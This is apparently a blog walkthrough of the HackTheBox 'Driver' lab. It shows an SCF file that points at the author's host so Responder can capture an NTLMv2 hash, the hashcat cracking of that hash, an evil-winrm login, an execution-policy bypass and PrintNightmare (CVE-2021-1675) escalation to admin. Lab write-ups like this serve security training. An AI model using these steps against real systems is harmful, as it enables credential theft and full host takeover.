---
title: HackTheBox Driver
date: 2022-02-26
categories: [CTF, hackthebox]
tags: [htb, hackthebox, ctf, nmap, firmware, printer, mfp, driver, rpc, smb, pentestlab, scf, shellcommandfile, responder, hashcat, evilwinrm, printnightmare, powershell, MS-RPRN, invoke-nightmare, unrestricted, bypass, powershellbypass, cve-2021-1675, cve, 2021-1675]     # TAG names should always be lowercase

image:
  src: /image/hackthebox/driver/driverinfocard.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: driverinfocard
---

# Machine information

Driver listed as an Easy machine. Port 80 is serving *MFP Firmware update center* site where uploading maliciously crafted file is stored in SMB server that leads to a password hash on responder. Later getting the user Tony, I escalate to root using PrintNightmare powershell script (Invoke-Nightmare).

# Enumeration

## nmap

Since this is listed as an Easy machine, I will upfront start scanning for services and thier versions with `nmap`, Nmap is a open source network scanner tool and is widely revered in InfoSec community for its accuracy on scanning. 

```bash
$_ sudo nmap -sC -sV -oA nmap/driver 10.10.11.106

Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 24.65 seconds
```

This is can happen when Host (10.10.11.106) is blocking the nmap packets and not replying to normal Ping scan. I can use `-Pn` flag on `nmap` to **treat Host As Online**. You can visit [this link](https://nmap.org/book/man-host-discovery.html) or do `man nmap` then press `/-Pn` to search for the string, and read the documentation all by yourself.

- `-sC` : To run default scripts against the target
- `-sV` : Do Version discovery on the output
- `-oA` : Put the output inside 'All' files i.e nmap, greppable nmap, xml

```bash
$_ sudo nmap -sC -sV -oA nmap/driver -Pn 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.23s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-22T12:58:22
|_  start_date: 2021-12-22T12:54:35
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h16m18s, deviation: 0s, median: 7h16m18s
```

## Port 80

`nmap` did said *MFP Firmware update center* , So I head over to Port 80. It is asking for credentials which I do not have at the moment.

<img src="/image/hackthebox/driver/01.png" alt="01" style="zoom:67%;" />

But it did reveal the username which is `admin`, So I used `admin:admin` as credentials that let me in. Below is the page.

<img src="/image/hackthebox/driver/02.png" alt="02" style="zoom:67%;" />

Like it says this site is used for printer updating using firmware. At the bottom is the hostname which I will add to my hostfile.

> 10.10.11.106    driver driver.htb

There is a `Firmware Updates` page where I can upload files, rest of the pages goes nowhere.

![03](/image/hackthebox/driver/03.png)

This does says Printer model. I have to enumerate more on this.

# Getting user

## RPC enumeration  

I normally use `rpcclient` but it is asking for credentials, I tried entering `admin:admin` like before but its not working. `rpcdump.py` from Impacket suite showed some interesting information

```bash
$_ rpcdump.py 10.10.11.106

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.11.106

...[snip]...

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Provider: spoolsv.exe 
UUID    : 76F03F96-CDFD-44FC-A22C-64950A001209 v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.11.106[49410]
          ncalrpc:[LRPC-b1aab278c8086f7ab3]

Protocol: N/A 
Provider: spoolsv.exe 
UUID    : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.11.106[49410]
          ncalrpc:[LRPC-b1aab278c8086f7ab3]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.11.106[49410]
          ncalrpc:[LRPC-b1aab278c8086f7ab3]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.11.106[49410]
          ncalrpc:[LRPC-b1aab278c8086f7ab3]

Protocol: [MS-RPRN]: Print System Remote Protocol 
Provider: spoolsv.exe 
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.11.106[49410]
          ncalrpc:[LRPC-b1aab278c8086f7ab3]

...[snip]...

[*] Received 456 endpoints.

```

## SMB Exploit

Now the thing is, I did not know what I must do. I googled for `MFP Fireware Updates Center` , `Printer upload Driver exploit` and what not nothing was leading me anywhere. `File Share` , this thing really got under my radar from upload page.

<img src="/image/hackthebox/driver/04.png" alt="04" style="zoom:67%;" />

I was like what!!! How can I miss this?! 

Anyway, The `File share` is really the SMB server. So any files uploaded from here are going to be saved in SMB share.

Now this time I googled `smb exploit printer firmware` and after reading A LOT of articles, I found the niddle in the haystack, This post was 3 years old  and it showed a way to exploit.  

<img src="/image/hackthebox/driver/05.png" alt="05" style="zoom: 80%;" />

* Article : https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

## Getting the hash

1.  I have to create a scf file. I named it `@amroot.scf`

 ```bash
 [Shell]
 Command=1
 IconFile=\\10.10.14.3\amroot\amroot.ico
 [Taskbar]
 Command=ToggleDesktop
 ```

2.  Created empty `amroot.ico` file using `touch amroot.ico`. Now I saved these files inside `amroot` folder, but I don't think placing these files inside a folder will make a difference.
3. Started reponder to catch the hash for user, `reposonder -I tun0`.
4. Uploaded `@amroot.scf` from the `Firmware Updates` page.

![06](/image/hackthebox/driver/06.png)

and within 10 seconds, reponder caught the hash for the `Tony` user.

![07](/image/hackthebox/driver/07.png)

Now on to cracking the hash.

As the `reponder` said that it is NTLMv2 hash.  I can possibly crack it using `hashcat`, since it has `5600` mode for NTLMv2 hash.

Here, 

1.  `-m` : Type of hash. You can check which mode to use by `hashcat --example-hashes`
2. `hashfile` : File containing hash
3. `wordlist` : Wordlist file
4. `--force` : Ignore warnings, You do not have to use it unless necessary.
5. `-a 0` : Attacking modes, here `0` meaning Straight 

``` bash
$_ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force -a 0

...[snip]...

TONY::DRIVER:049843be0c0e2c63:d8e54d4716192b8df3d598f910c5014a:010100000000000080c45cde68f7d7016f6754d2740840960000000002000800560031004200570001001e00570049004e002d005600450038004f005800550048004c005a003100450004003400570049004e002d005600450038004f005800550048004c005a00310045002e0056003100420057002e004c004f00430041004c000300140056003100420057002e004c004f00430041004c000500140056003100420057002e004c004f00430041004c000700080080c45cde68f7d7010600040002000000080030003000000000000000000000000020000024901167a1a1332e907fa7ec1d4b35500d82459a9b6372a1b941e4d218b51bf20a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003300000000000000000000000000:liltony 

...[snip]...
```

Now I have the credentials `Tony:liltony`. I used `evil-winrm` to login.

![08](/image/hackthebox/driver/08.png)

# Getting root

## exploiting PrintNightmare

During the `rpcdump.py`, there was `Protocol: [MS-RPRN]: Print System Remote Protocol ` service running, It means that I should try `PrintNightmare` exploit. 

In `PrintNightmare` exploit, an attacker with valid crendentials for a user on the machine is able to add a printer and a driver for that, in the end it gives the attacker a system level access. It is listed as `CVE-2021-1675`.

I will try to get reverse shell 3 ways.

### using Invoke-Nightmare

1. First I will clone [this repository](https://github.com/calebstewart/CVE-2021-1675), moved it into `invoke-nightmare`.

2. I uploaded the `ps1` file to the machine.

   ```bash
   *Evil-WinRM* PS C:\Users\tony\Downloads> upload invoke-nightmare/CVE-2021-1675.ps1
   Info: Uploading invoke-nightmare/CVE-2021-1675.ps1 to C:\Users\tony\Downloads\CVE-2021-1675.ps1
   
                                                                
   Data: 238080 bytes of 238080 bytes copied
   
   Info: Upload successful!
   ```

3.  I was getting error while importing the module because of Execution policy is set to `Restricted`. As you can see it in the below image.

   ![09](/image/hackthebox/driver/09.png)

4.  The simplest way to avoid this is to try changing to `Unrestricted` which I did in my case.

   ```bash
   *Evil-WinRM* PS C:\Users\tony\Downloads> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
   
   *Evil-WinRM* PS C:\Users\tony\Downloads> get-executionpolicy
   Unrestricted
   ```

5.  Now I was able to load the module

   ```bash
   *Evil-WinRM* PS C:\Users\tony\Downloads> Import-Module .\CVE-2021-1675.ps1
   ```

6.  I was able to add myself as the user in the machine.

   ![10](/image/hackthebox/driver/10.png)

7. Doing `net user amroot` showed me that I was indeed granted admin rights.

   <img src="/image/hackthebox/driver/11.png" alt="11" style="zoom:67%;" />

8. Finally, I was able to login and read the `root.txt` file.

<img src="/image/hackthebox/driver/12.png" alt="12" style="zoom:67%;" />



